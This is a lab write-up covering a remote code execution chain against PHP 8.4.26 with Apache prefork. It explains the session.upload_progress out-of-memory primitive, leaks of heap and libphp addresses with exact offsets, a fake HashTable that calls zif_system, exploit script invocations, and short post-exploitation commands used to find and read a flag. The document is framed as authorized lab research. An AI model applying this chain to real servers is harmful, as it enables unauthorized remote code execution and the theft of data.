# PHP2Shell: from the Docker lab to remote RCE and the flag

Validation date: 26 October 2026.

This document describes the reproduction performed against the authorized
private lab `http://192.168.125.10/index.php`. The addresses, offsets and
geometries below are specific to PHP 8.4.26, Apache prefork, x86_64 and
this particular binary build. This is not a universal exploit.

## Result

- Zend MM chunk base disclosed: `0x717b64200000`;
- `zval_ptr_dtor` leaked: `0x717b6652db60`;
- `libphp.so` base: `0x717b65ecf000`;
- `zif_system` address: `0x717b66334370`;
- RCE proven with `sleep 5`;
- execution confirmed as `www-data`;
- flag read from `/var/www/proof.txt`.

Root escalation was not required: the flag was outside the DocumentRoot but
readable by the Apache account.

## 1. Building the reference local lab

The main lab lives in `docker/php2shell-lab/`. It uses a PHP 8.4.26 amd64
image pinned by digest and publishes only on the host loopback.

On native Linux x86_64:

```sh
cd docker/php2shell-lab
./scripts/up.sh
./scripts/status.sh
curl --noproxy '*' -fsS http://127.0.0.1:9090/index.php
./scripts/test.sh id
```

To change the local port:

```sh
export PHP2SHELL_HOST_PORT=9191
./scripts/down.sh
./scripts/up.sh
./scripts/status.sh
./scripts/test.sh id
```

On Apple Silicon or Linux ARM64, `ALLOW_EMULATION=1` starts the amd64 image
for smoke testing:

```sh
ALLOW_EMULATION=1 ./scripts/up.sh
```

The reference ASLR/RCE proof should still be produced on native Linux x86_64.
QEMU/Rosetta emulation changes timings and allocator behaviour.

The main lab loads `zz-php2shell.ini` first, which contains the invariants
needed by the chain:

```ini
memory_limit=8M
post_max_size=32M
max_input_vars=1000
session.upload_progress.enabled=1
session.upload_progress.cleanup=1
session.use_cookies=1
session.use_strict_mode=0
```

A second file forces `display_errors=Off` for the repository's clean PoC. The
remote target studied here had `display_errors=On` instead. Both profiles
reach the same dangerous lifecycle, but their leak requests are not
interchangeable.

## 2. Understanding the A/B primitive

Each phase uses two multipart requests on the same Apache child:

```text
request A
  -> PHP parses RFC 1867 before index.php
  -> session.upload_progress initializes session globals
  -> a 12 MiB field exceeds memory_limit=8M
  -> the OOM bailout skips part of the cleanup
  -> a session pointer remains attached to freed request memory

request B
  -> new multipart fields reallocate the freed chunks
  -> the old pointer now designates a controlled structure
  -> the primitive becomes a leak or an indirect call
```

The target PHP script does not need to implement an upload. Multipart parsing
and the `session.upload_progress` callback run before application code. Here,
`index.php` contains only:

```php
<?php echo "OK\n"; ?>
```

## 3. Why a fresh worker is mandatory

The heap geometry depends on the child's history. A control request, a
browser, a health check or a previous attempt can move the reallocated zone.
Never issue a GET between a successful rotation and the next request A.

The rotation sends:

1. a multipart containing hundreds of live values;
2. the `PHPSESSID` and `PHP_SESSION_UPLOAD_PROGRESS` controls;
3. a short file part;
4. a final 12 MiB field for the OOM;
5. a cleanup request that consumes the corrupted state and terminates the
   child.

An empty response to the cleanup is the oracle used in this lab. Apache
prefork recreates a child from the same master. Code mappings remain identical,
but the new Zend MM starts from a clean state.

Two shapes were useful:

- the standard rotation: `1001` values of `3000` bytes;
- after many attempts and GETs: `900` values of `3000` bytes.

The second shape is implemented in `run_known_command.py`.

## 4. Remote reconnaissance

The first passive request returned:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.69 (Debian)
X-Powered-By: PHP/8.4.26
Connection: close

OK
```

Controlled OOMs then confirmed:

- `memory_limit=8M`;
- `display_errors=On`;
- mod_php with Apache prefork;
- a single available worker;
- `session.upload_progress` exploitable before the application.

The lab's `display_errors=Off` PoC was therefore not used as-is. The public
engine kept in `sources/alvarodh5-php2shell/exploit.py` served as the base
for the remote `display_errors=On` profile.

## 5. Phase 1: leaking the Zend MM chunk

Request A creates the dangling pointer. Request B reallocates the `PS(id)`
chunk with a fake `zend_string` whose length is `0x1000`.

When the `Set-Cookie` header is generated, PHP reads beyond the actual string.
The pointers observed in the 4096 disclosed bytes cluster by 2 MiB region.
The dominant region yields:

```text
Zend MM chunk base = 0x717b64200000
```

This step bypasses heap ASLR without reading `/proc` and without a debugger
on the target.

## 6. Phase 2: leaking libphp

The public PoC initially created `983` arrays and expanded the array at index
`406`. On this target, allocations made after index 406 overwrote the
interesting structure.

The calibration consisted of:

1. confirming by binary search that the overlap occurs at index `406`;
2. keeping that object as the last allocation;
3. reducing the total to `N=407`, with `T=406` and 16 children.

The resulting cookie is:

```text
100000000000000060db52667b710000
```

Little-endian decoding:

```text
nNextFreeElement = 0x10
zval_ptr_dtor    = 0x717b6652db60
```

For the official PHP 8.4.26 trixie x86_64 image used by this target:

```text
zval_ptr_dtor offset = 0x65eb60
zif_system offset    = 0x465370
```

Calculations:

```text
libphp = 0x717b6652db60 - 0x65eb60
       = 0x717b65ecf000

zif_system = 0x717b65ecf000 + 0x465370
           = 0x717b66334370
```

## 7. Phase 3: fake HashTable and execution

The third phase reallocates `PS(http_session_vars)` with a fake reference
pointing to a fake `HashTable`. The values used are:

```text
HTDATA offset = 0x690d8
HTDATA        = 0x717b64200000 + 0x690d8
              = 0x717b642690d8

pDestructor   = zif_system
              = 0x717b66334370
```

The fake `execute_data` contains a string argument that becomes the shell
command. The 167-byte carrier limits this command to 14 bytes.

## 8. Proving RCE without depending on the filesystem

The first `id` attempts did not return output: the child terminated before
PHP flushed its HTTP buffer. A relative redirection also depended on the
Apache working directory.

The robust proof therefore used:

```text
sleep 5
```

Observed measurements:

```text
rotation OOM       4.904 s   693 bytes
rotation cleanup   0.260 s   empty response
terminal A         3.056 s   367 bytes
terminal B         5.220 s   empty response
```

Without execution, the terminal B POST normally closes the connection in
approximately `0.2 s`. The extra five-second delay confirms that
`zif_system` was called.

Reproduction command after an Apache restart:

```sh
python3 lab/offsec/rce_display_on.py --assume-fresh
```

The script repeats both leaks, recalculates the addresses and uses `sleep 5`
by default. Without a prior restart, remove `--assume-fresh` to request an
initial rotation.

## 9. Running other short commands

As long as the Apache master does not restart, recreated workers inherit the
same mappings. After a successful full leak, the following helper reuses the
addresses and retries only the terminal pair:

```sh
python3 lab/offsec/run_known_command.py -c 'whoami>f'
curl -sS http://192.168.125.10/f
```

Result:

```text
www-data
```

`run_known_command.py` is deliberately specific to this instance and this
Apache master. After any master restart, re-run `rce_display_on.py` and
update its constants before reusing it.

## 10. Finding and recovering the flag

The first hypotheses were tested with commands of at most 14 bytes:

```text
cat /flag>f       -> HTTP file created but empty
cat /flag*>f      -> no /flag* file
env >f            -> no FLAG variable
ls -la / >f       -> no flag at the root
whoami>f          -> www-data
sudo -l>f 2>&1    -> sudo absent
getcap -r />f     -> no exploitable file capability
ls -l /bin/>f     -> only standard Debian SUIDs
mount>f           -> no exploitable host socket or device
```

Becoming root was not necessary. A recursive inventory of `/var` revealed
`proof.txt` next to the DocumentRoot:

```sh
python3 lab/offsec/run_known_command.py -c 'ls -Ra /var>f'
curl -sS http://192.168.125.10/f | grep -i proof
```

The worker's current directory is `/var/www/html`, confirmed by `env`. The
following short command therefore reads `/var/www/proof.txt`:

```sh
python3 lab/offsec/run_known_command.py -c 'cat ../p*>f'
curl -sS http://192.168.125.10/f
```

## 11. Produced files

- `lab/offsec/rce_display_on.py`: full remote chain with leaks;
- `lab/offsec/run_known_command.py`: terminal commands after calibration;
- `artifacts/remote-offsec-20261026/report.md`: validation report;
- `sources/alvarodh5-php2shell/exploit.py`: reused multipart engine;
- `docker/php2shell-lab/`: isolated and reproducible local lab.

## 12. Limitations and reproducibility rules

1. Only use a system you own or that is explicitly authorized.
2. Do not send a health check between a rotation and request A.
3. Any stray request can change the worker or the heap geometry.
4. An empty response alone is not proof of RCE; the `sleep 5` timing proof
   or a verifiable side effect is required.
5. A master restart invalidates all absolute addresses.
6. ELF offsets depend on the exact build, not just the PHP version.
7. The known-address helper never replaces the initial leaks on a new target.
8. The `f` file is a temporary artifact created in the DocumentRoot and must
   be removed after collecting the proof.
